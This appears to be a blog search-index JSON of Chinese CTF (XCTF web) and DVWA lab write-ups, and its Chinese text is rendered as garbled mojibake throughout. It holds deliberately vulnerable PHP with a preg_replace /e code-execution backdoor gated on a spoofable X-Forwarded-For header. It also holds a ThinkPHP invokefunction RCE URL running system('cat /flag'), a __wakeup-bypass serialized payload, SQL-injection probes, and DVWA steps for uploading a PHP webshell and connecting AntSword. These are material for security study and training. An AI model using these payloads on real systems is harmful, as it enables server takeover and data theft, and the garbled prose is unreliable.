&#39;è®¾å¤‡å&#39;, templet: &#39;#nameTpl&#39; &#125;, &#123; field: &#39;area&#39;, title: &#39;åŒºåŸŸ&#39; &#125;, &#123; field: &#39;status&#39;, title: &#39;ç»´æŠ¤çŠ¶æ€&#39;, minWidth: 120, sort: true &#125;, &#123; field: &#39;check&#39;, title: &#39;è®¾å¤‡å¼€å…³&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;element&#39;, function() &#123; var element &#x3D; layui.element; &#x2F;&#x2F;å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å— &#x2F;&#x2F;ç›‘å¬å¯¼èˆªç‚¹å‡» element.on(&#39;nav(demo)&#39;, function(elem) &#123; &#x2F;&#x2F;console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;&#x2F;script&gt;&lt;?php$page &#x3D; $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;else&#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt; &lt;?php if (strpos($page, &#39;input&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;text&#39;) &gt; 0) &#123; die(); &#125; if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123; die(&#39;Ok&#39;); &#125; include($page); die(); ?&gt; &lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;&#125;&#x2F;&#x2F;æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å…¶ä¸­æœ€å…³é”®çš„ä»£ç å†…å®¹ï¼š 1234567891011121314151617181920212223&lt;?php&#125;&#125;&#x2F;&#x2F;æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; ä»£ç å®¡è®¡ï¼šå½“æœåŠ¡å™¨æ”¶åˆ°æ¥è‡ªip=127.0.0.1çš„è®¿é—®è¯·æ±‚æ—¶ï¼Œä¼šè®¤ä¸ºå…¶æ˜¯ç®¡ç†å‘˜ã€‚æ­¤æ—¶å¯ä»¥ä¼´éšä¸Šä¼ ä¸‰ä¸ªå‚æ•°ï¼Œä½œä¸ºpreg_replace()å‡½æ•°çš„å˜é‡ã€‚ å­¦ä¹ ï¼š preg_replace()å‡½æ•°å±é™©çš„/eä¿®é¥°ç¬¦ï¼ˆhttps://www.jb51.net/article/38714.htmï¼‰ è¯´æ˜ï¼š/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚ preg_replace($pattern, $replacement, $subject)ä½œç”¨ï¼šæœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementçš„å†…å®¹è¿›è¡Œæ›¿æ¢ã€‚$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"æ”»é˜²ä¸–ç•Œwebè¿›é˜¶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/æ”»é˜²ä¸–ç•Œwebè¿›é˜¶1/","text":"baby_webæˆ‘ä»¬ç‚¹å‡»é¢˜ç›®åœºæ™¯ï¼Œå‘ç°è·³è½¬åˆ°1.php æŸ¥é˜…èµ„æ–™å‘ç°ä¸€èˆ¬ç½‘ç«™çš„åˆå§‹é¡µé¢éƒ½æ˜¯index.phpï¼Œäºæ˜¯åœ¨urlä¸­è¾“å…¥index.phpï¼Œä½†æ˜¯åˆè‡ªåŠ¨è·³è½¬åˆ°1.phpã€‚ F12è¿›å…¥å¼€å‘è€…æ¨¡å¼ï¼ŒæŸ¥çœ‹ç½‘ç»œæ¨¡å—ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagå°±åœ¨å…¶ä¸­ï¼ŒåŒæ—¶å‘ç°ç½‘é¡µè·³è½¬çš„åŸå› å°±æ˜¯locationæŒ‡å‘æ–‡ä»¶1.phpã€‚ spï¼šlocationâ€”â€”ç”¨äºé‡å®šå‘ä¸€ä¸ªæ–°çš„ä½ç½®ï¼ŒåŒ…å«ä¸€ä¸ªæ–°çš„urlã€‚è¡¨ç¤ºç”¨æˆ·åº”å½“åˆ°æŒ‡å®šåœ°å€æå–æ–‡ä»¶ã€‚ Training-WWW-Robotsæœ¬é¢˜ä¸»è¦è€ƒå¯Ÿå¯¹robots.txtçš„äº†è§£å’Œä½œç”¨ã€‚ robots.txtæ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä½¿ç”¨ä»»ä½•ä¸€ä¸ªå¸¸è§çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚Windowsç³»ç»Ÿè‡ªå¸¦çš„Notepadï¼Œå°±å¯ä»¥åˆ›å»ºå’Œç¼–è¾‘å®ƒ ã€‚robots.txtæ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚Robots.txtåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚ å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚ æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œçœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå¯¹robots.txtçš„ç®€ä»‹ è®¿é—®ä¸€ä¸‹è¿™ä¸ªç½‘ç«™çš„robots.txt ç½‘ç«™ä¸è®©æˆ‘ä»¬è®¿é—®è¿™ä¸ªfl0g.phpï¼Œé‚£æˆ‘ä»¬å°±åè®¿é—® â€‹ å‘ç°flagï¼Œæ”¶å·¥ php_rceæ²¡ææ‡‚ http://111.200.241.244:42333/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag php2è¿›å…¥é¢˜ç›®é¡µé¢ æŸ¥çœ‹ç½‘é¡µæºç ã€å›æ˜¾éƒ½æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼ŒæŸ¥é˜…èµ„æ–™å¾—çŸ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡phpsæŸ¥çœ‹phpæºç ã€‚ phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚ æŸ¥çœ‹è¯¥é¡µé¢æºç ï¼š ä»£ç å®¡è®¡å¯çŸ¥ï¼Œå½“id=adminæ—¶ä¸ä¼šçˆ†flagï¼Œä½†æ˜¯å½“adminç»è¿‡ç¼–ç åå¯å¾—flag ç”±äºæœ¬å…³urlè§£ç äº†ä¸¤æ¬¡ï¼ˆæµè§ˆå™¨ä¸Šä¼ æœåŠ¡å™¨ä¸€æ¬¡ï¼Œurldecodeå‡½æ•°ä¸€æ¬¡ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ?id=%2561dmin ics-06: æˆ‘ä»¬æ ¹æ®é¢˜ç›®æç¤ºæ‰“å¼€æŠ¥è¡¨ä¸­å¿ƒ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°id=1ï¼Œé‚£ä¼šä¸ä¼šæ˜¯å‚æ•°æœ‰é—®é¢˜å‘¢ ç”¨burpæŠ“åŒ…ï¼Œå¯¹idè¿›è¡Œçˆ†ç ´ï¼Œå‘ç°å½“id=2333æ—¶çˆ†å‡ºflag ä½†æ˜¯è¿™é¢˜æœ‰ä¸€ç‚¹ä¸æ˜ç™½ï¼Œå°±æ˜¯ä¸ºä»€ä¹ˆé¢˜ç›®è¯´ï¼šäº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚ä¸ºä»€ä¹ˆç—•è¿¹æ˜¯idçš„å€¼ï¼Ÿ Web_php_includeå‚è€ƒhttps://blog.csdn.net/weixin_45844670/article/details/108180309 warmupå‚è€ƒhttps://blog.csdn.net/yybzzz/article/details/104971608 unserialize3æ¶è¡¥äº†ä¸€ä¸‹ååºåˆ—åŒ–æ“ä½œä¸åºåˆ—åºåˆ—åŒ–æ“ä½œã€‚å‚è€ƒèµ„æ–™ï¼šhttps://www.freebuf.com/articles/web/167721.html https://blog.csdn.net/weixin_44677409/article/details/93884388 æˆ‘è¿™è¾¹å°±ç®€å•çš„æ¦‚æ‹¬ä¸€ä¸‹ï¼š åºåˆ—åŒ–â€”â€”å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚ ååºåˆ—åŒ–â€”â€”å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚ å¦‚å›¾åºåˆ—åŒ–å! é­”æœ¯æ–¹æ³•ï¼ˆï¼‰ï¼š _construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–_destruction()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡_toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨_sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨_wakeup()ï¼šååºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨_call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨_get()ï¼šè°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨ æ³¨ï¼š 1.çš„é­”æœ¯æ–¹æ³•å¿…é¡»å£°æ˜ä¸º public 2.publicå±æ€§åºåˆ—åŒ–åæ ¼å¼ä¸ºï¼šæ•°æ®ç±»å‹:å±æ€§åé•¿åº¦:â€å±æ€§åâ€ã€‚ äº†è§£äº†ä¸Šè¿°è¿™äº›æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç­”é¢˜å•¦ æˆ‘ä»¬çœ‹åˆ°wakeup()å‡½æ•°ï¼Œå†ç»“åˆé¢˜ç›®unseriasize3å¯ä»¥å¾—çŸ¥è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–æ“ä½œçš„é¢˜ï¼Œ æ ¹æ®å‰ä¸¤è¡Œä»£ç å¯çŸ¥å­˜åœ¨ä¸€ä¸ªæ•°ç»„åxctfï¼Œé”®æ•°1ï¼Œé”®åflagï¼Œé”®å€¼111çš„æ•°ç»„ï¼Œ åœ¨__wakeup()é­”æœ¯æ–¹æ³•ä¸­ï¼Œåœ¨ååºåˆ—åŒ–å‰ä¼šè‡ªåŠ¨è°ƒç”¨ _wakeupæ–¹æ³•ï¼Œå¼ºåˆ¶è¾“å‡ºbad requestsï¼Œå› æ­¤æˆ‘ä»¬è¦ç»•è¿‡ä¹‹ è§£é¢˜å…³é”®ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°ï¼ˆé”®æ•°ï¼‰çš„å€¼å¤§äºå®é™…çš„å±æ€§ä¸ªæ•°ï¼ˆé”®æ•°ï¼‰æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ æ„é€ å­—ç¬¦ä¸²?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;ç»•è¿‡__wakeupæ–¹æ³• supersqliæ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯SQLæ³¨å…¥çš„é¢˜ï¼Œå…ˆæ‹¿sqlmapè·‘äº†ä¸€ä¸‹ï¼Œå‘ç°åªèƒ½è·‘å‡ºæ•°æ®åº“åï¼Œå†ä¸‹å»å°±è·‘ä¸åŠ¨äº†ï¼Œäºæ˜¯åªèƒ½å›æ¥ä¹–ä¹–æ‰‹å·¥æ³¨å…¥ã€‚ è¾“å…¥1&#39;æŠ¥é”™ è¾“å…¥1&#39; and &#39;1&#39;=&#39;1ï¼Œæ­£å¸¸ï¼› è¾“å…¥1&#39; and &#39;1&#39;=&#39;2ï¼Œå¼‚å¸¸ï¼› å› æ­¤æ³¨å…¥ç±»å‹ä¸º&#39;ã€‚ å°è¯•unionè”åˆæ³¨å…¥ï¼Œå‘ç°è¿‡æ»¤äº†è®¸å¤šå•è¯ å› æ­¤é¿å…ä½¿ç”¨å«selectè¯­å¥çš„æ–¹å¼å¥½åƒä¹Ÿåªæœ‰å †å æ³¨å…¥äº† å‚è€ƒåšå®¢ï¼šhttps://blog.csdn.net/rfrder/article/details/108583338","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"DVWAâ€”Weak Session IDs","date":"2021-03-12T08:50:01.000Z","path":"2021/03/12/DVWAâ€”Weak Session IDs/","text":"å‰è¨€ï¼šWeak Session IDsï¼šå¯†ç ä¸è¯ä¹¦ç­‰è®¤è¯æ‰‹æ®µï¼Œä¸€èˆ¬ä»…ä»…ç”¨äºç™»å½•ï¼ˆLoginï¼‰çš„è¿‡ç¨‹ã€‚å½“ç™»é™†å®Œæˆåï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™çš„é¡µé¢ï¼Œä¸å¯èƒ½æ¯æ¬¡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶éƒ½å†ä½¿ç”¨å¯†ç è®¤è¯ä¸€æ¬¡ã€‚å› æ­¤ï¼Œå½“è®¤è¯å®Œæˆåã€‚å°±éœ€è¦æ›¿æ¢ä¸€ä¸ªå¯¹ç”¨æˆ·é€æ˜çš„å‡­è¯ã€‚è¿™ä¸ªå‡­è¯å°±æ˜¯SessionIDã€‚å½“ç”¨æˆ·ç™»é™†å®Œæˆåï¼Œåœ¨æœåŠ¡å™¨ç«¯å°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼ˆSessionï¼‰ï¼Œä¼šè¯ä¸­ä¼šä¿å­˜ç”¨æˆ·çš„çŠ¶æ€å’Œç›¸å…³ä¿¡æ¯ã€‚æœåŠ¡å™¨ç«¯ç»´æŠ¤æ‰€æœ‰åœ¨çº¿ç”¨æˆ·çš„Sessionï¼Œæ­¤æ—¶çš„è®¤è¯ï¼Œåªéœ€è¦çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·åœ¨æµè§ˆå½“å‰çš„é¡µé¢å³å¯ã€‚ä¸ºäº†å‘Šè¯‰æœåŠ¡å™¨åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªSessionï¼Œæµè§ˆå™¨éœ€è¦æŠŠå½“å‰ç”¨æˆ·æŒæœ‰çš„SessionIDå‘ŠçŸ¥æœåŠ¡å™¨ã€‚SessionIDä¸€æ—¦åœ¨ç”Ÿå‘½å‘¨æœŸå†…è¢«çªƒå–ï¼Œå°±ç­‰åŒäºè´¦æˆ·å¤±çªƒã€‚åŒæ—¶ç”±äºSessionIDæ˜¯ç”¨æˆ·ç™»å½•ä¹‹åæ‰æŒæœ‰çš„è®¤è¯å‡­è¯ï¼Œå› æ­¤é»‘å®¢ä¸éœ€è¦å†æ”»å‡»ç™»é™†è¿‡ç¨‹ï¼ˆæ¯”å¦‚å¯†ç ï¼‰ã€‚â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæ‘˜è‡ªä¸ºCSDNåšä¸»ã€Œbaynkã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/u014029795/article/details/102795784","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”File Uplod","date":"2021-03-12T02:37:19.000Z","path":"2021/03/12/DVWAâ€”File Uplod/","text":"å‰è¨€ï¼šä¹‹å‰åˆ·è¿‡uploadå°±ä¸å¤šè¯´äº† Lowï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰åšä»»ä½•æ£€æŸ¥ã€è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ webshell.phpï¼Œè¿æ¥èšå‰‘ï¼Œå³å¯æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨ã€‚ ![1](DVWAâ€”File Uplod/1.png) Mediumï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å¤§å°åšäº†é™åˆ¶ï¼Œè¦æ±‚æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯jpegæˆ–è€…pngï¼Œå¤§å°ä¸èƒ½è¶…è¿‡100000Bï¼ˆçº¦ä¸º97.6KBï¼‰ã€‚ æ³•ä¸€ï¼šæ­é…æ–‡ä»¶åŒ…å«æ¼æ´ æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åä¸ºwebshell.pngï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´çš„ç‰¹æ€§ï¼Œå€ŸåŠ©Mediumçº§åˆ«çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥è·å–webshellæƒé™ã€‚ç”¨èšå‰‘è¿æ¥ï¼šhttp://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.pngï¼Œä½†æ˜¯å‘ç°è¿æ¥å¤±è´¥ï¼Œè¿”å›å†…å®¹ä¸ºç©ºã€‚åŸæ¥ï¼Œèšå‰‘åœ¨è¿æ¥æ—¶å¹¶æ²¡æœ‰æºå¸¦cookieï¼Œæ­£å› ä¸ºç¼ºå°‘cookieå€¼æ‰æ— æ³•è¿æ¥æˆåŠŸã€‚ è§£å†³æ–¹æ³•å°±æ˜¯æ·»åŠ cookieï¼Œå…·ä½“è¯·çœ‹ï¼šhttps://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh æ³•äºŒï¼šæŠ“åŒ…ä¿®æ”¹ æˆ‘ä»¬å…ˆä¸Šä¼ webshell.pngï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶ååç¼€ä¸ºphp ![2](DVWAâ€”File Uplod/2.png) èšå‰‘è¿æ¥å³å¯ ![1](DVWAâ€”File Uplod/1.png) Highï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿™æ¬¡æ£€æŸ¥äº†æ–‡ä»¶ååç¼€ï¼Œè®¾ç½®äº†ç™½åå•ï¼Œå¹¶ä¸”getimagesizeå‡½æ•°æ£€æŸ¥äº†æ–‡ä»¶å¤´å†…å®¹ã€‚ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬æ­é…æ–‡ä»¶åŒ…å«æ¼æ´å®Œæˆç»•è¿‡ã€‚å…·ä½“æ­¥éª¤å’ŒMediumçº§åˆ«çš„ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ 